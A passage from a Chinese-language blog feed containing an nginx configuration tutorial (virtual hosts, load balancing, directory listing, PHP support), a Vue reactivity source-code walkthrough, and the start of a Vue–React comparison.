<h3 id="uri"><a href="#uri" class="headerlink" title="$uri"></a>$uri</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前请求中的当前URI(不带请求参数,参数位于$args)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Node_全栈工程师node常用API</title>
    <url>/2018/04/17/Node-%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88node%E5%B8%B8%E7%94%A8API/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>Node</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx配置详情</title>
    <url>/2019/10/24/Nginx_Nginx%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="Nginx配置详情"><a href="#Nginx配置详情" class="headerlink" title="Nginx配置详情"></a>Nginx配置详情</h2><h3 id="一、Nginx1-16-0的安装"><a href="#一、Nginx1-16-0的安装" class="headerlink" title="一、Nginx1.16.0的安装"></a>一、Nginx1.16.0的安装</h3><p>Nginx1.16.0安装详见 <a href="https://blog.csdn.net/niuxitong/article/details/89610004" target="_blank" rel="noopener">CentOS7.3编译安装LNMP之(一)Nginx-1.16.0安装</a></p>
<p>本文以nginx1.16.0编译安装版为例，目录如下</p>
<p>/usr/local/nginx/    nginx的安装目录<br>/usr/local/nginx/conf/   nginx的配置目录<br>/usr/local/nginx/conf/nginx.conf    默认的主配置文件<br>/usr/local/nginx/html/      默认站点<br>/usr/local/nginx/conf/vhost/          我们自己创建的专门用来放置虚拟主机的配置文件的目录</p>
<h3 id="二、nginx配置文件一般包含以下模块："><a href="#二、nginx配置文件一般包含以下模块：" class="headerlink" title="二、nginx配置文件一般包含以下模块："></a>二、nginx配置文件一般包含以下模块：</h3><h4 id="1、main全局模块：配置Nginx用户（组）、worker-process数、进程PID存放路径、日志的存放路径等配置"><a href="#1、main全局模块：配置Nginx用户（组）、worker-process数、进程PID存放路径、日志的存放路径等配置" class="headerlink" title="1、main全局模块：配置Nginx用户（组）、worker process数、进程PID存放路径、日志的存放路径等配置"></a>1、main全局模块：配置Nginx用户（组）、worker process数、进程PID存放路径、日志的存放路径等配置</h4><h4 id="2、events模块：配置影响nginx服务器或与用户的网络连接，有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等"><a href="#2、events模块：配置影响nginx服务器或与用户的网络连接，有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等" class="headerlink" title="2、events模块：配置影响nginx服务器或与用户的网络连接，有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等"></a>2、events模块：配置影响nginx服务器或与用户的网络连接，有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等</h4><h4 id="3、http模块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。"><a href="#3、http模块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。" class="headerlink" title="3、http模块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。"></a>3、http模块：可以嵌套多个server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。</h4><h5 id="3-1、http全局模块：如mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等"><a href="#3-1、http全局模块：如mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等" class="headerlink" title="3-1、http全局模块：如mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等"></a>3-1、http全局模块：如mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等</h5><h5 id="3-2、server模块：配置虚拟主机的相关参数，一个http中可以有多个server"><a href="#3-2、server模块：配置虚拟主机的相关参数，一个http中可以有多个server" class="headerlink" title="3-2、server模块：配置虚拟主机的相关参数，一个http中可以有多个server"></a>3-2、server模块：配置虚拟主机的相关参数，一个http中可以有多个server</h5><h6 id="3-2-1、server全局模块：配置站点的端口号、域名、目录等"><a href="#3-2-1、server全局模块：配置站点的端口号、域名、目录等" class="headerlink" title="3-2-1、server全局模块：配置站点的端口号、域名、目录等"></a>3-2-1、server全局模块：配置站点的端口号、域名、目录等</h6><h6 id="3-2-2、location模块：配置请求的路由，以及各种页面的处理情况"><a href="#3-2-2、location模块：配置请求的路由，以及各种页面的处理情况" class="headerlink" title="3-2-2、location模块：配置请求的路由，以及各种页面的处理情况"></a>3-2-2、location模块：配置请求的路由，以及各种页面的处理情况</h6><p><img src="/static/img/nginx_1.png"></p>
<p>具体内容详情如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 每个指令必须有分号结束，用#号注释， 注释部分为可选项，未注释的为必须的 ###</span><br><span class="line"></span><br><span class="line"># main全局块：配置影响nginx全局的指令。一般有运行nginx服务器的用户组，nginx进程pid存放路径，日志存放路径，配置文件引入，允许生成worker process数等。</span><br><span class="line">#user nginx nginx; #配置用户或者组，默认为nobody nobody。</span><br><span class="line">worker_processes  1;		#允许生成的进程数，默认为1， 最大为cpu核数或者cup核数的两倍</span><br><span class="line"></span><br><span class="line">#制定日志路径，级别。这个设置可以放入全局块，http块，server块，级别以此为：debug|info|notice|warn|error|crit|alert|emerg</span><br><span class="line">#error_log  logs/error.log;</span><br><span class="line">#error_log  logs/error.log  notice;</span><br><span class="line">#error_log  logs/error.log  info;</span><br><span class="line"></span><br><span class="line">#pid        logs/nginx.pid;	#指定nginx进程运行文件存放地址</span><br><span class="line"></span><br><span class="line">#最大文件打开数（连接），可设置为系统优化后的ulimit -HSn的结果</span><br><span class="line">#worker_rlimit_nofile 51200;</span><br><span class="line">#cpu亲和力配置，让不同的进程使用不同的cpu</span><br><span class="line">#worker_cpu_affinity 0001 0010 0100 1000 0001 00100100 1000;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#2、events块：配置影响nginx服务器或与用户的网络连接。有每个进程的最大连接数，选取哪种事件驱动模型处理连接请求，是否允许同时接受多个网路连接，开启多个网络连接序列化等。</span><br><span class="line">events &#123;</span><br><span class="line">    use epoll;       #epoll是多路复用IO(I/O Multiplexing)中的一种方式,但是仅用于linux2.6以上内核,可以大大提高nginx的性能</span><br><span class="line">    #accept_mutex on;   #设置网路连接序列化，防止惊群现象发生，默认为on</span><br><span class="line">    #multi_accept on;  #设置一个进程是否同时接受多个网络连接，默认为off</span><br><span class="line">    worker_connections  1024; #单个后台worker process进程的最大并发链接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#3、http块：可以嵌套多个server（每个server为一个站点），配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。如文件引入，mime-type定义，日志自定义，是否使用sendfile传输文件，连接超时时间，单连接请求数等。</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;		#文件扩展名与类型映射表。来查看mime.types文件内容，我们发现其就是一个types结构，里面包含了各种浏览器能够识别的MIME类型以及对应类型的文件后缀名字</span><br><span class="line">    default_type  application/octet-stream;   #默认文件类型，默认为text/plain</span><br><span class="line"></span><br><span class="line">    #log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">    #                  &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">    #                  &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    #access_log  logs/access.log  main;   #自定义服务日志</span><br><span class="line"></span><br><span class="line">    sendfile        on;				#允许sendfile方式传输文件，默认为on，表示高效文件传输模式，可以在http块，server块，location块。</span><br><span class="line">    #sendfile_max_chunk 100k;  #每个进程每次调用传输数量不能大于设定的值，默认为0，即不设上限。</span><br><span class="line">    #tcp_nopush     on;			#激活tcp_nopush参数可以允许把httpresponse header和文件的开始放在一个文件里发布，积极的作用是减少网络报文段的数量</span><br><span class="line">    # tcp_nodelay on; 			#激活tcp_nodelay，内核会等待将更多的字节组成一个数据包，从而提高I/O性能</span><br><span class="line">    #keepalive_timeout  0;			#设置长连接超时时间，默认为75s，可以在http，server，location块。</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line">	#gzip_min_length  1k;   #gzip  on开启才有效，设置允许压缩的页面最小字节数，页面字节数从header头的Content-Length中获取。默认值是0，表示不管页面多大都进行压缩。建议设置成大于1K。如果小于1K可能会越压越大</span><br><span class="line"></span><br><span class="line">	#upstream表示负载服务器池，定义名字为backend_server的服务器池</span><br><span class="line">#	upstream myweb &#123;</span><br><span class="line">#		server 118.24.241.124 [weight=1 max_fails=2 fail_timeout=30s];</span><br><span class="line">#		server 106.12.2.195:8081 [weight=1 max_fails=2 fail_timeout=30s];</span><br><span class="line">#		server 106.12.2.195:8082 [weight=1 max_fails=2 fail_timeout=30s];</span><br><span class="line">#		server 106.12.2.195:8083 [weight=1 max_fails=2 fail_timeout=30s];</span><br><span class="line">#	&#125;</span><br><span class="line"></span><br><span class="line">#设置由 fail_timeout 定义的时间段内连接该主机的失败次数，以此来断定 fail_timeout 定义的时间段内该主机是否可用。默认情况下这个数值设置为 1。零值的话禁用这个数量的尝试。设置在指定时间内连接到主机的失败次数，超过该次数该主机被认为不可用。这里是在30s内尝试2次失败即认为主机不可用！</span><br><span class="line"></span><br><span class="line">	#基于域名的虚拟主机</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;		#端口号，</span><br><span class="line">        server_name  localhost;		#域名 多个用空格隔开，  也可以是IP地址如</span><br><span class="line">        #root  /home/wwwroot/qinser   #站点根目录，可以是相对路径，也可以是绝对路径，此项目也可以放置的到 location /&#123; &#125;里配置</span><br><span class="line">        #index index.php index.html index.htm;  #设置默认页 此项目也可以放置的到 location /&#123; &#125;里配置</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            #	proxy_pass http://myweb;   proxy_pass  #请求转向myweb定义的服务器列表， 用于负载均衡，如果开启了，那么此处自己的站点就不能访问了</span><br><span class="line">            root   /home/wwwroot/qinser;</span><br><span class="line">            index index.php index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        #</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    proxy_pass   http://127.0.0.1;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #  支持PHP配置模块 #符合php扩展名的请求调度到fcgi server</span><br><span class="line">        location ~ \.php$ &#123;</span><br><span class="line">            #root           /home/wwwroot/qinser;     #上面已经配置过了，这里就不用配置了</span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;				#因为php-fpm启用的是9000端口，因此这里表示抛给本机的9000端口</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  /usr/local/nginx/html$fastcgi_script_name;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class="line">        # concurs with nginx&apos;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ /\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	#每个站点都需要配置一个server模块,为了方便管理，这里把每个站点的配置文件统一放入到./vhost/目录下，并统一使用 .conf为后缀。</span><br><span class="line">	include /usr/local/nginx/conf/vhost/*.conf</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="三、配置虚拟站点"><a href="#三、配置虚拟站点" class="headerlink" title="三、配置虚拟站点"></a>三、配置虚拟站点</h3><p> 创建一个虚拟站点，域名为my.niuxitong.com, 站点根目录为/home/wwwroot/niuxitong/。<br>1、创建站点目录及文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># mkdir -p /home/wwwroot/niuxitong/</span><br><span class="line"># vim index.html</span><br><span class="line">输入内容如下</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>mytest<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        this is my test site!!!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2、创建配置文件<br>配置文件名为my.niuxitong.com.conf 位于/usr/local/nginx/conf/vhost/下。(确保在nginx主配置文件里include进来了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># vim /usr/local/nginx/conf/vhost/my.niuxitong.com.conf</span><br><span class="line"></span><br><span class="line">输入如下内容：（最基本的配置）</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name my.niuxitong.com;</span><br><span class="line">    root /home/wwwroot/niuxitong;</span><br><span class="line">    # 设置默认文件名</span><br><span class="line">    index index.html index.htm default.html default.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">检查配置文件有没有语法错误</span><br><span class="line"># nginx -t</span><br><span class="line"></span><br><span class="line">重启nginx</span><br><span class="line"># service nginx restart</span><br></pre></td></tr></table></figure>
<p>3、在你本地C:\Windows\System32\drivers\etc\下的hosts文件里添加如下域名<br>106.12.2.195 my.niuxitong.com</p>
<p>访问：<a href="http://my.niuxitong.com/" target="_blank" rel="noopener">http://my.niuxitong.com/</a></p>
<p><img src="/static/img/nginx_2.png"></p><p style="text-align: center;position:relative;top:-24px;">OK配置成功</p><p></p>
<h3 id="四、配置负载均衡服务器"><a href="#四、配置负载均衡服务器" class="headerlink" title="四、配置负载均衡服务器"></a>四、配置负载均衡服务器</h3><p>由于本人只有两台服务器：<br>106.12.2.195 为主服务器<br>118.24.241.124 ：为从服务器</p>
<p>一主服务器的默认站点为负载， 并在主服务器上创建两个虚拟站点106.12.2.195:8081  和 106.12.2.195:8082: 。通过默认站点分发到  118.24.241.124、106.12.2.195:8081、106.12.2.195:8082 这三个站点上：</p>
<p>1、在主服务器上分别建立两个虚拟站点：分别位于/home/wwwroot/weba、/home/wwwroot/webb两个目录下，配置文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># vim 106.12.2.195:8081.conf</span><br><span class="line">内容如下：</span><br><span class="line">server &#123;</span><br><span class="line">    listen 8081;</span><br><span class="line">    server_name 106.12.2.195:8081;</span><br><span class="line">    root /home/wwwroot/weba;</span><br><span class="line">    index index.html index.htm default.html defaut.htm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># vim 106.12.2.195:8082.conf</span><br><span class="line">内容如下：</span><br><span class="line">server &#123;</span><br><span class="line">    listen 8082;</span><br><span class="line">    server_name 106.12.2.195:8082;</span><br><span class="line">    root /home/wwwroot/webb;</span><br><span class="line">    index index.html index.htm default.html defaut.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、在主服务器的默认配置文件./nginx.conf设置如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##主站点的配置如下：</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    #配置负载均衡</span><br><span class="line">    #upstream 表示负载均衡服务器池  定义名字为mywebs的服务器池</span><br><span class="line">    upstream mywebs&#123;</span><br><span class="line">        server 118.24.241.124;</span><br><span class="line">        server 106.12.2.195:8081;</span><br><span class="line">        server 106.12.2.195:8082;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    server &#123;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://mywebs;    //转发到名为mywebs的服务器池中</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3、重启nginx</p>
<p>4、访问<a href="http://106.12.2.195/" target="_blank" rel="noopener">http://106.12.2.195/</a> 不停的刷新，在三个站点之间来回切换。</p>
<p><img src="/static/img/nginx_3.png"></p><p style="text-align: center;position:relative;top:-24px;">OK负载均衡搭建成功</p><p></p>
<p>5、模拟测试其中一台服务器宕机的情形</p>
<p>把118.24.241.124 这台服务器nginx关闭 ，这时我们刷新<a href="http://106.12.2.195/" target="_blank" rel="noopener">http://106.12.2.195/</a>  只在weba、webb两个站点之间切换。</p>
<h3 id="五、设置目录列表"><a href="#五、设置目录列表" class="headerlink" title="五、设置目录列表"></a>五、设置目录列表</h3><p>默认情况下，如果没有对应的索引文件，如果我们直接访问，会报403 Forbidden错误的。可以通过autoindex  on;属性来设置列目录</p>
<p>此属性可以在http全局块设置，对所有站点有效。也可以在server全局块设置，对当前站点有效</p>
<p>演示：在my.niuxitong.com站点模块设置<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vim /usr/local/nginx/conf/vhost/my.niuxitong.com.conf</span><br><span class="line"></span><br><span class="line">在server全局块加入如下三行</span><br><span class="line"></span><br><span class="line"> autoindex on;        #开启目录列表</span><br><span class="line"> autoindex_exact_size on;     #默认值为off 以kB、mB、GB显示文件的大概大小， 如果设置为on则精准显示文件的大小</span><br><span class="line"> autoindex_localtime on;     #默认值为on 表示显示文件最后一次被修改的服务器时间（格林尼治时间）</span><br></pre></td></tr></table></figure></p>
<p>把默认索引文件名 index.html  修改为 index2.html;</p>
<p>访问 <a href="http://my.niuxitong.com/" target="_blank" rel="noopener">http://my.niuxitong.com/</a> 显示如图：</p>
<p><img src="/static/img/nginx_4.png"></p>
<h3 id="六、让nginx支持PHP"><a href="#六、让nginx支持PHP" class="headerlink" title="六、让nginx支持PHP"></a>六、让nginx支持PHP</h3><p>PHP-7.2.18安装 详见 <a href="https://blog.csdn.net/niuxitong/article/details/89906045" target="_blank" rel="noopener">CentOS7.3编译安装LNMP之(三)PHP-7.2.18安装</a></p>
<p>仍以上文提到的my.niuxitong.com站点为例，PHP安装部署好以后，在./vhost/my.niuxitong.com.conf配置文件内添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name my.niuxitong.com;</span><br><span class="line">    root /home/wwwroot/niuxitong;</span><br><span class="line"></span><br><span class="line">    index index.php index.html ....;   #默认文件增加一个index.php</span><br><span class="line"></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    #设置使nginx支持PHP</span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        fastcgi_index  index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  /home/wwwroot/niuxitong$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在此站点目录创建 index.php文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/static/img/nginx_5.png"></p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>H5常见的API</title>
    <url>/2018/04/17/H5_H5%E5%B8%B8%E8%A7%81%E7%9A%84API/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>H5</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>H5</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue_vue数据监听原理</title>
    <url>/2018/05/30/Vue_vue%E4%BB%A3%E7%A0%81%E7%BA%A7%E6%A1%86%E6%9E%B6%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="vue整体框架和主要流程分析"><a href="#vue整体框架和主要流程分析" class="headerlink" title="vue整体框架和主要流程分析"></a>vue整体框架和主要流程分析</h1><p>之前对看过比较多关于vue源码的文章，但是对于整体框架和流程还是有些模糊，最后用chrome debug对vue的源码进行查看整理出这篇文章。。。。</p>
<p>本文对vue的整体框架和整体流程进行简要的分析，不对某些具体的细节进行分析，所有需要对vue有初步的认识，包括对Object.defineProperty、虚拟DOM有一定了解，本文不会对Object.defineProperty、虚拟DOM的原理和细节进行分析。<br>vue大体可以分两个部分：</p>
<p>1.采用Object.defineProperty进行数据的双向绑定；</p>
<p>2.采用虚拟DOM技术进行视图渲染；</p>
<h2 id="vue入口"><a href="#vue入口" class="headerlink" title="vue入口"></a>vue入口</h2><p><img src="/static/img/vue1.png" width="800"></p>
<p>vue构造函数调用了this._init(options)方法，这个方法在initMixin中，如上图所示，进入initMixin<br><img src="/static/img/vue2.png" width="800"></p>
<p>initMixin主要完成数据的初始化和视图的初始化：</p>
<p>1.数据初始化主要是数据的observe，在上图的initState中进行；</p>
<p>2.视图的初始化在vm.$mount(vm.$options.el),其中vm为Vue的实例，watcher的设置也是在vm.$mount(vm.$options.el）中完成的；</p>
<p>我们可以看到这里定义了beforeCreated和created这两个钩子函数。</p>
<h2 id="数据初始化"><a href="#数据初始化" class="headerlink" title="数据初始化"></a>数据初始化</h2><p>接着上面我们看看数据初始化都做了什么，进入initState<br><img src="/static/img/vue3.png" width="800"></p>
<p>这里我们主要对数据进行操作的是initData，传入的是vm，我们来具体看看initData：<br><img src="/static/img/vue4.png" width="800"></p>
<p>我们先忽略前面的一些逻辑判断，主要看两个地方：</p>
<p>1.数据代理，主要是将_data的数据代理到vm上，这样的话可以直接对vm上的数据进行修改;</p>
<p>2.数据observe，传入data；</p>
<p>我们先看看vue怎么对数据进行observe的，进入observe<br><img src="/static/img/vue5.png" width="800"></p>
<p>在observe里返回的是ob，也就是Observer类的实例，我们看看Observer类是怎么定义的，进入Observer类<br><img src="/static/img/vue6.png" width="800"></p>
<p>如上图在对data进行observe时对数组进行了特殊的处理，这块我们先不看，先看一般情况下的处理，即调用this.walk(value)<br><img src="/static/img/vue7.png" width="800"></p>
<p>walk主要对data的属性进行遍历，进入defineReactive<br><img src="/static/img/vue8.png" width="800"></p>
<p>可以看到Object.defineProperty是在这里对属性设置get和set的，其中get主要进行依赖收集，其实就是在收集视图渲染的watcher，后面会提到，set主要是数据更新时进行视图的更新</p>
<p>至此，数据的初始化就完成了，从上面的分析来看，数据的初始化主要的工作就是对数据进行observe。</p>
<h2 id="视图挂载"><a href="#视图挂载" class="headerlink" title="视图挂载"></a>视图挂载</h2><p>接着上面，在vue入口那里，我们知道视图的挂载主要是调用了vm.$mount(vm.$options.el)</p>
<p><img src="/static/img/vue9.png" width="800"><br>如图，所以我们进入vm.$mount，看看里面都干了啥，在源码里面有两处地方涉及到$mount</p>
<p><img src="/static/img/vue10.png" width="800"></p>
<p>这是第一处，就是return mountComponent<br><img src="/static/img/vue11.png" width="800"></p>
<p>这是第二处</p>
<p>咱们看看第二处，里面做了一个处理，就是将template编译成render函数，在vue的教程里有render函数的使用，这里我们可以看出我们在组件里定义render函数会比定义template快，因为在定义template的组件挂载时多了一步将template编译成render函数；</p>
<p>第二处的return 还是调用了第一处，所以我们看看第一处调用的mountComponent方法，进入mountComponent</p>
<p><img src="/static/img/vue13.png" width="800"></p>
<p>这里我们可以看到定义了两个钩子beforeMount和mount，中间调用了watcher，我们看一下这里watcher的定义，这里标注的不太好，挡住了。。。我们看看watcher的这行代码：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">vm._watcher=<span class="keyword">new</span> Watcher(vm,updateComponent,noop)</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到Watcher类主要传入了vm,updateComponent,noop三个参数，其中updateComponent的主要作用是将虚拟DOM转化为真实的DOM并进行挂载，具体的细节下面在讨论，我们下面看看Watcher类是怎么定义的，进入Watcher</p>
<p><img src="/static/img/vue15.png" width="800"></p>
<p>这里我们注意两个地方，一个是this.getter的定义，这里就是上面传进来的updateComponent，还有就是执行this.get()，我们进入这个get方法<br><img src="/static/img/vue16.png" width="800"></p>
<p>这里我们看到首先收集的依赖是当前watcher实例，然后调用getter方法也就是updateComponent方法，之前我们对updateComponent方法的作用进行了简单的说明，这里我们具体看看updateComponent都干了啥，进入updateComponent:<br><img src="/static/img/vue17.png" width="800"></p>
<p>这里调用了vm._update方法，其中传入的参数有vm._render()，_render函数主要的作用是产生虚拟DOM，进入_update<br><img src="/static/img/vue18.png" width="800"></p>
<p>这里主要是将虚拟DOM转化为真实DOM并进行挂载，分两种情况，分别是有旧的虚拟DOM和无旧的虚拟DOM，对应初始化时调用还是数据更新时调用,这里定义了一个钩子beforeUpdate</p>
<p>到这里，视图的初始化和挂载也结束了，下面看看数据变化时视图是如何更新的</p>
<h2 id="数据变化时视图更新过程"><a href="#数据变化时视图更新过程" class="headerlink" title="数据变化时视图更新过程"></a>数据变化时视图更新过程</h2><p>接着上面我们看看数据变化时视图是怎么变化的，在数据初始化的时候，我们知道数据变化时将触发set方法，如下图：</p>
<p><img src="/static/img/vue19.png" width="800"></p>
<p>上图可以看出，set最后调用了dep.notify，进入notify<br><img src="/static/img/vue20.png" width="800"></p>
<p>如上图，notify主要将收集的依赖，也就是收集的所有watcher，调用所有watcher的update方法，我们看看watcher的updata方法干了啥</p>
<p><img src="/static/img/vue21.png" width="800"></p>
<p>这里就是调用了queueWatcher,进入queueWatcher</p>
<p><img src="/static/img/vue22.png" width="800"><br>这里采用队列异步更新，就是讲=将watcher push进队列queue中，然后执行nextTick方法，进入nextTick</p>
<p><img src="/static/img/vue23.png" width="800"></p>
<p>这个部分有点难看，cb为传入的flushSchedulerQueue函数，执行timerFunc，将nextTickHander加入异步队列，执行nextTickHander，执行cb，既执行flushSchedulerQueue，进入flushSchedulerQueue<br><img src="/static/img/vue25.png" width="800"></p>
<p>主要看watcher.run(),进入watcher.run<br><img src="/static/img/vue27.png" width="800"></p>
<p>执行了this.get()，即进入前面数据渲染和挂载的地方</p>
<p>到这里，vue整个的执行流程基本就结束了。</p>
<h2 id="vue流程图"><a href="#vue流程图" class="headerlink" title="vue流程图"></a>vue流程图</h2><p>盗用一下vue官网关于vue生命周期的图，对照之前的内容梳理一下：</p>
<p><img src="/static/img/vue28.png" width="400"></p>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title>React_react和vue的差别</title>
    <url>/2018/04/17/React-react%E5%92%8Cvue%E7%9A%84%E5%B7%AE%E5%88%AB/</url>
    <content><![CDATA[<h1 id="Vue与React的对比"><a href="#Vue与React的对比" class="headerlink" title="Vue与React的对比"></a>Vue与React的对比</h1><p><code>Vue.js</code>与<code>React.js</code>从某些反面来说很相似，通过两个框架的学习，有时候对一些用法会有一点思考，为加深学习的思索，特翻阅了两个文档，从以下各方面进行了对比，加深了对这两个框架的认知。</p>
<h2 id="1-数据绑定"><a href="#1-数据绑定" class="headerlink" title="1.数据绑定"></a>1.数据绑定</h2><h3 id="1-1-Vue中有关数据绑定的部分"><a href="#1-1-Vue中有关数据绑定的部分" class="headerlink" title="1.1 Vue中有关数据绑定的部分"></a>1.1 Vue中有关数据绑定的部分</h3><ul>
<li>vue是双向绑定， <code>Vue.js</code> 最核心的功能有两个，一是响应式的数据绑定系统，二是组件系统。所谓双向绑定，指的是<code>Vue</code>实例中的data与其渲染的DOM元素的内容保持一致，无论谁被改变，另一方会相应的更新为相同的数据。这是通过设置属性访问器实现的。</li>
<li>在<code>Vue</code>中，与数据绑定有关的有 <code>插值表达式、指令系统、*Class和Style、事件处理器和表单空间、ajax请求和计算属性</code></li>
</ul>
<h4 id="1-1-1插值表达式"><a href="#1-1-1插值表达式" class="headerlink" title="1.1.1插值表达式"></a>1.1.1插值表达式</h4><p>插值和指令又称为模板语法</p>
<ul>
<li>数据绑定最常见的形式就是使用<code>“Mustache”</code>语法 (双大括号) 的文本插值</li>
<li><code>Mustache</code> 语法不能作用在 <code>HTML</code> 特性上，遇到这种情况应该使用 <code>v-bind</code> 指令</li>
</ul>
<h4 id="1-1-2-指令"><a href="#1-1-2-指令" class="headerlink" title="1.1.2 指令"></a>1.1.2 指令</h4><ul>
